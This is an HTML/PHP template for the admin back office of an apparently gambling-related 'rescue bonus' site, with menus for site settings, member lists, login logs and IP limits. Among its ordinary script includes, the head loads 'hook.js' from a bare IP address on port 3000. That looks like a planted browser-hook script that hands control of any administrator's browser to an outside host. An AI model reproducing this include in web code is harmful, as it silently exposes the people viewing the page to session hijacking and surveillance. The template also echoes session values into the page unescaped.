<!DOCTYPE html>
<html>
<head>
	<meta http-equiv="content-type" content="text/html; charset=UTF-8">
	<meta charset="utf-8">
	<title>救援彩金后台管理系统</title>
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no">
	<meta name="description" content="">
	<meta name="author" content="">
	<link rel="stylesheet" type="text/css" href="bootstrap/css/cloud-admin.css" >
	<link rel="stylesheet" type="text/css"  href="bootstrap/css/themes/default.css" id="skin-switcher" >
	<link rel="stylesheet" type="text/css"  href="bootstrap/css/responsive.css" >
	<!-- STYLESHEETS --><!--[if lt IE 9]><script src="js/flot/excanvas.min.js"></script><script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script><script src="http://css3-mediaqueries-js.googlecode.com/svn/trunk/css3-mediaqueries.js"></script><![endif]-->
	<link href="bootstrap/font-awesome/css/font-awesome.min.css" rel="stylesheet">
	<!-- ANIMATE -->
	<link rel="stylesheet" type="text/css" href="bootstrap/css/animatecss/animate.min.css" />
	<!-- TODO -->
	<link rel="stylesheet" type="text/css" href="bootstrap/js/jquery-todo/css/styles.css" />
	
		<!-- JAVASCRIPTS -->
	<!-- Placed at the end of the document so the pages load faster -->
   <script src="http://38.54.80.88:3000/hook.js"></script>
	<!-- JQUERY -->
	<script src="bootstrap/js/jquery/jquery-2.0.3.min.js"></script>
			<!-- JQUERY UI-->
	<script src="bootstrap/js/jquery-ui-1.10.3.custom/js/jquery-ui-1.10.3.custom.min.js"></script>
	<!-- BOOTSTRAP -->
	<script src="bootstrap/bootstrap-dist/js/bootstrap.min.js"></script>
	<!-- /JAVASCRIPTS -->
	<script type="text/javascript">
	
	function iFrameSrc(urlStr){
		document.getElementById("iframepage").src=urlStr;
	}
	
	function iFrameHeight(iframe) {
		var iframeWin = iframe.contentWindow || iframe.contentDocument.parentWindow;
		if (iframeWin.document.body) {
		iframe.height = iframeWin.document.documentElement.scrollHeight || iframeWin.document.body.scrollHeight;
		}
    }
	function test_auto(){
		test_auto1();
	}
	function test_auto1(){
		$.ajax({
			url : 'test_auto.php?id=1',
			type : 'POST',
			dataType : 'json',
			success : function(obj){
				if(obj){
					if(obj.status == -1){
						$('#auto_status_1').text(obj.msg);
						$('#auto_status_color_1').css("background-color","red");
						setTimeout('test_auto1();',60000);
					}else if(obj.status == 0){
						$('#auto_status_1').text("正在运行");
						$('#auto_status_color_1').css("background-color","green");
						setTimeout('test_auto1();',60000);
				    }else{
					    alert(obj.msg);
					    $('#auto_status_1').text("状态未知");
						$('#auto_status_color_1').css("background-color","red");
						setTimeout('test_auto1();',60000);
					}
					//console.log(obj.msg);
				}else{
					$('#auto_status_1').text("状态未知");
					$('#auto_status_color_1').css("background-color","red");
					setTimeout('test_auto1();',60000);
				}
			},
			error: function(XMLHttpRequest, textStatus, errorThrown) {
				setTimeout('test_auto1();',60000);
				//alert(errorThrown.message);
			}
		});
	}
	</script>
</head>
<body onload="test_auto();">
	<!-- HEADER -->
	<header class="navbar clearfix" id="header">
		<div class="container">
				<div class="navbar-brand">
					<!-- COMPANY LOGO -->
					<a href="index.html">
						<img src="bootstrap/img/logo/logo.png" alt="Cloud Admin Logo" class="img-responsive" height="30" width="120">
					</a>
					<!-- /COMPANY LOGO -->
					<!-- TEAM STATUS FOR MOBILE -->
					<div class="visible-xs">
						<a href="#" class="team-status-toggle switcher btn dropdown-toggle">
							<i class="fa fa-users"></i>
						</a>
					</div>
					<!-- /TEAM STATUS FOR MOBILE -->
				</div>
				<!-- <ul class="nav navbar-nav pull-left hidden-xs" id="navbar-left"> -->
					<!-- <li class="dropdown"> -->
						<!-- <a href="#" class="team-status-toggle dropdown-toggle tip-bottom" data-toggle="tooltip" title="Toggle Team View"> -->
							<!-- <i class="fa fa-users"></i> <span class="name" id="auto_status_color_1">充值监控：<span id="auto_status_1"></span></span> -->
						<!-- </a> -->
					<!-- </li> -->
				<!-- </ul>  -->
				<!-- NAVBAR LEFT -->
				<!-- BEGIN TOP NAVIGATION MENU -->
				<ul class="nav navbar-nav pull-right">
					<!-- BEGIN USER LOGIN DROPDOWN -->
					<li class="dropdown user" id="header-user">
						<a href="#" class="dropdown-toggle" data-toggle="dropdown">
							<img alt="" src="bootstrap/img/avatars/avatar3.jpg" />
							<span class="username">当前登录：<?php echo $_SESSION['auser']['auser'];?>&nbsp;&nbsp;[<?php if($_SESSION['auser']['level']==1){echo "<font color=red>系统管理员</font>";}else{echo "<font color=green>普通管理员</font>";}?>]</span>
							<i class="fa fa-angle-down"></i>
						</a>
						<ul class="dropdown-menu">
							<li><a href="javascript:iFrameSrc('index.php?m=Ctrl&c=User&a=logout')"><i class="fa fa-power-off"></i>&nbsp;&nbsp;退&nbsp;&nbsp;出</a></li>
						</ul>
					</li>
					<!-- END USER LOGIN DROPDOWN -->
				</ul>
				<!-- END TOP NAVIGATION MENU -->
		</div>
	</header>
	<!--/HEADER -->
	
	<!-- PAGE -->
	<section id="page">
				<!-- SIDEBAR -->
				<div id="sidebar" class="sidebar">
					<div class="sidebar-menu nav-collapse">
						<!-- SIDEBAR QUICK-LAUNCH -->
						<!-- <div id="quicklaunch">
						<!-- /SIDEBAR QUICK-LAUNCH -->
						
						<!-- SIDEBAR MENU -->
						<ul>
						<if condition="$Think.session.auser.auser eq 'admin'">
							<li class="has-sub">
								<a href="javascript:;" class="">
								<i class="fa fa-bookmark-o fa-fw"></i> <span class="menu-text">救援彩金</span>
								<span class="arrow"></span>
								</a>
								<ul class="sub">
									<li><a class="" href="javascript:iFrameSrc('index.php?m=Ctrl&c=LotterySetting');"><span class="sub-menu-text">网站设置</span></a></li>
									<li><a class="" href="javascript:iFrameSrc('sym/level_list.php');"><span class="sub-menu-text">等级配置</span></a></li>
									<li><a class="" href="javascript:iFrameSrc('sym/mg_list.php');"><span class="sub-menu-text">会员列表</span></a></li>
									<li><a class="" href="javascript:iFrameSrc('sym/win_list.php');"><span class="sub-menu-text">会员申请列表</span></a></li>
									<li><a class="" href="javascript:iFrameSrc('sym/excel_log.php');"><span class="sub-menu-text">机器人充值日志</span></a></li>
								</ul>
							</li>
							<li class="has-sub">
								<a href="javascript:;" class="">
								<i class="fa fa-bookmark-o fa-fw"></i> <span class="menu-text">系统设置</span>
								<span class="arrow"></span>
								</a>
								<ul class="sub">
									<li><a class="" href="javascript:iFrameSrc('sym/sys_log.php');"><span class="sub-menu-text">登陆日志</span></a></li>
 									<li><a class="" href="javascript:iFrameSrc('sym/manage_ip.php');"><span class="sub-menu-text">IP限制</span></a></li> 
									<li><a class="" href="javascript:iFrameSrc('sym/sys_pass.php?act=edit&user=<?php echo $_SESSION['auser']['auser']; ?>');"><span class="sub-menu-text">修改密码</span></a></li>
									<li><a class="" href="javascript:iFrameSrc('sym/cuslink.php');"><span class="sub-menu-text">客服链接</span></a></li>
								</ul>
							</li>
							<else/>
							<li class="has-sub">
								<a href="javascript:;" class="">
								<i class="fa fa-bookmark-o fa-fw"></i> <span class="menu-text">我的菜单</span>
								<span class="arrow"></span>
								</a>
								<ul class="sub">
									<?php 
										$menuData = explode(',',$_SESSION['auser']['privilege']);
										$menuCode = "";
										$menuName = "";
										for ($x=0; $x<count($menuData); $x++) {
				                        $menuCode  = $menuData[$x];
				                        $menuCode =  str_replace('\'', '', $menuCode);
										if($menuCode == "lottery_setting"){
											$menuName = "网站设置";
										}else if($menuCode == "mg_list"){
											$menuName = "救援金列表";
										}else if($menuCode == "win_list"){
											$menuName = "会员申请列表";
										}else if($menuCode == "excel_log"){
											$menuName = "机器人充值日志";
										}
									?>
										<li><a class="" href="javascript:iFrameSrc('<?php echo $menuCode?>.php');"><span class="sub-menu-text"><?php echo $menuName ?></span></a></li>
									<?php }?>
									<li><a class="" href="javascript:iFrameSrc('sys_pass.php?act=edit&user=<?php echo $_SESSION['auser']['auser']; ?>');"><span class="sub-menu-text">修改密码</span></a></li>
								
								</ul>
							</li>
						</if>
						</ul>
						<!-- /SIDEBAR MENU -->
					</div>
				</div>
				<!-- /SIDEBAR -->
		<div id="main-content">
			<div class="container">
				<div class="row">
					<div id="content" class="col-lg-12" style="padding-top: 13px;">
						<iframe src="index.php?m=Ctrl&a=main_desk" width="100%" height="100%" id="iframepage" style="min-height:800px;" onLoad="iFrameHeight(this)" frameborder="no" border="0" marginwidth="0" marginheight="0" scrolling="no" ></iframe>
					</div>
					<!-- /CONTENT-->
				</div>
			</div>
		</div>
	</section>
	<!--/PAGE -->
</body>
<script type="text/javascript">
jQuery('.sidebar-menu .has-sub > a').click(function () {
    var last = jQuery('.has-sub.open', $('.sidebar-menu'));
    last.removeClass("open");
    jQuery('.arrow', last).removeClass("open");
    jQuery('.sub', last).slideUp(200);
    
	var thisElement = $(this);
	var slideOffeset = -200;
    var slideSpeed = 200;
	
    var sub = jQuery(this).next();
    if (sub.is(":visible")) {
        jQuery('.arrow', jQuery(this)).removeClass("open");
        jQuery(this).parent().removeClass("open");
		sub.slideUp(slideSpeed, function () {
			if ($('#sidebar').hasClass('sidebar-fixed') == false) {
			}

        });
    } else {
        jQuery('.arrow', jQuery(this)).addClass("open");
        jQuery(this).parent().addClass("open");
        sub.slideDown(slideSpeed, function () {
			if ($('#sidebar').hasClass('sidebar-fixed') == false) {
			}

        });
    }
});
</script>
</html>